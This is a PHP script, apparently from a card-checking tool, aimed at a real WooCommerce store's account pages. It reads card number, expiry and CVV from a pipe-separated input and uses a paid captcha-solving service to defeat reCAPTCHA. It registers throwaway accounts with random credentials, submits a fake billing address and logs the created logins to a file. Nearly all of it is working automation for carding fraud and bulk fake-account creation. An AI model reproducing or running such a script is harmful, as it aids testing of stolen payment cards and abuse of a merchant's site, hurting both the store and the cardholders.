<?php
error_reporting(0); 

include("anticaptcha.php");
include("nocaptchaproxyless.php");

if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
    extract($_POST); 
} 
else { 
   extract($_GET); 
} 
 
function GetStr($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 

function RandomString($length = 5)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
 
$separator = explode("|", $lista);  
$cc = $separator[0]; 
$mm = $separator[1]; 
$yy = $separator[2]; 
$cvv = $separator[3];
$username = RandomString().mt_rand(1, 999);
$postcode = mt_rand(10080, 94545);

$api = new NoCaptchaProxyless();
$api->setVerboseMode(true);
        
//your anti-captcha.com account key
$api->setKey("YOUR API KEY HERE");

//target website address
$api->setWebsiteURL("https://sonuscore.com/my-account/add-payment-method/");

//recaptcha key from target website
$api->setWebsiteKey("6LcrjhIUAAAAAFXOoKRUNfwEVAbRqi-pYqY0mDRE");

//create task in API
if (!$api->createTask()) {
    $api->debout("API v2 send failed - ".$api->getErrorMessage(), "red");
    return false;
}

$taskId = $api->getTaskId();

//wait in a loop for max 300 seconds till task is solved
if (!$api->waitForResult(300)) {
    echo "could not solve captcha\n";
} else {
    $gResponse    =   $api->getTaskSolution();
}


    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://sonuscore.com/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://sonuscore.com',
        'referer: https://sonuscore.com/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "email=$username%40gmail.com&password=$username&terms=on&terms-field=1&g-recaptcha-response=$gResponse&woocommerce-register-nonce=e29163571d&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register",
));
    $register = curl_exec($ch);

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://sonuscore.com/my-account/edit-address/billing/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://sonuscore.com/my-account/edit-address/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $prepare_address = curl_exec($ch);
    $edit_address_nonce = GetStr($prepare_address, 'name="woocommerce-edit-address-nonce" value="', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://sonuscore.com/my-account/edit-address/billing/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://sonuscore.com',
        'referer: https://sonuscore.com/my-account/edit-address/billing/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "billing_first_name=Ragnhild&billing_last_name=Eriksdottir&billing_company=&billing_country=US&billing_address_1=24+otog+street&billing_address_2=&billing_city=saxoncity&billing_state=CA&billing_postcode=$postcode&billing_phone=&billing_email=$username%40gmail.com&save_address=Save+address&woocommerce-edit-address-nonce=$edit_address_nonce&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
));
    $execute = curl_exec($ch);

if(strpos($execute, 'Address changed successfully')){ 
    
    echo '<tr><td><span class="badge badge-outline-danger badge-pill">Success</span></td></tr><br>'; 
    fwrite(fopen("sonuscore.com_accounts.txt", "a"), $username."@gmail.com:".$username."\r\n");
    
}
else { 
    
	echo '<tr><td><span class="badge badge-outline-danger badge-pill">Not Success</span></td></tr><br>'; 
    
}
unlink("$username.txt");
?>
